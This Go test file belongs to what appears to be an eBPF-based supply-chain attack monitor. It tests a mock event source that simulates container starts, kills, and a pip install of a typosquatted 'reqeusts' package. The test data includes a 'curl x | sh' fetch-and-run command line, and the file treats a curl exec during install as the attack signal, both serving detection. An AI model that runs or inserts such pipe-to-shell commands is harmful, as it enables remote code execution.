package ingestion

import (
	"context"
	"testing"
	"time"

	"github.com/DevLSJ/ebpf-supplychain-guard/backend/internal/model"
)

func TestCleanArgs(t *testing.T) {
	if got := cleanArgs([]byte("sh\x00-c\x00curl x | sh\x00\x00")); got != "sh -c curl x | sh" {
		t.Fatalf("got %q", got)
	}
}

func TestMockKillStopsContainer(t *testing.T) {
	m := NewMock()
	m.Interval, m.AttackIn, m.RestartIn = time.Millisecond, time.Hour, time.Hour
	out := make(chan model.Event, 4096)
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Millisecond)
	defer cancel()
	go m.Run(ctx, out)

	var victim string
	for ev := range out {
		if ev.ContainerName == "web-api" {
			victim = ev.ContainerID
			break
		}
	}
	if err := m.Kill(ctx, victim); err != nil {
		t.Fatal(err)
	}
	for len(out) > 0 {
		<-out // 이미 채널에 들어간 이벤트는 버린다
	}
	<-ctx.Done()
	for len(out) > 0 {
		if ev := <-out; ev.ContainerID == victim {
			t.Fatal("killed container kept emitting events")
		}
	}
}

// mock 소스: 시작 이벤트를 보내고, 보고된 설치 세션을 흉내 낸다(reqeusts → 공격 이벤트). kill 하면 종료 이벤트 뒤 멈춘다.
func TestMockSimulateInstall(t *testing.T) {
	InstallStep = time.Millisecond
	m := NewMock()
	m.Interval, m.AttackIn, m.RestartIn = time.Hour, time.Hour, time.Hour
	out := make(chan model.Event, 4096)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go m.Run(ctx, out)

	starts := map[string]bool{}
	for range 3 {
		ev := <-out
		if ev.Kind != model.KindStart || ev.ImageName == "" {
			t.Fatalf("first events must be container starts, got %+v", ev)
		}
		starts[ev.ContainerName] = true
	}
	if !starts["pkg-reqeusts"] {
		t.Fatalf("starts: %v", starts)
	}

	m.SimulateInstall(model.InstallSession{Manager: "pip", Packages: []string{"./reqeusts"}, Container: "sg-install-pip-1"})
	var id string
	var sawAttack bool
	for ev := range out {
		if ev.ContainerName != "sg-install-pip-1" {
			continue
		}
		if ev.Kind == model.KindStart {
			id = ev.ContainerID
			if ev.ImageName != "python:3.12-slim" {
				t.Fatalf("default pip image, got %q", ev.ImageName)
			}
		}
		if ev.Kind == model.KindExec && ev.Comm == "curl" {
			sawAttack = true
			if err := m.Kill(ctx, id); err != nil {
				t.Fatal(err)
			}
		}
		if ev.Kind == model.KindExit {
			break
		}
	}
	if !sawAttack || id == "" {
		t.Fatal("reqeusts install must play the attack")
	}
	if err := m.Kill(ctx, id); err == nil {
		t.Fatal("second kill must report not running")
	}
}

// mock 소스는 trace_dns 가 항상 있는 것으로 본다: connect 이벤트에 DNSTraced 가 붙고 DNSTraced() 는 true
func TestMockReportsDNSTraced(t *testing.T) {
	m := NewMock()
	if !m.DNSTraced() {
		t.Fatal("mock must report DNS tracing on")
	}
	c := &mockContainer{id: "x", name: "web-api"}
	if ev := c.event(model.Event{Kind: model.KindConnect, DstIP: "203.0.113.7", DstPort: 443}, time.Now()); !ev.DNSTraced {
		t.Fatalf("connect event must carry DNSTraced, got %+v", ev)
	}
	if ev := c.event(model.Event{Kind: model.KindExec, Comm: "sh"}, time.Now()); ev.DNSTraced {
		t.Fatalf("non-connect event must not carry DNSTraced, got %+v", ev)
	}
}
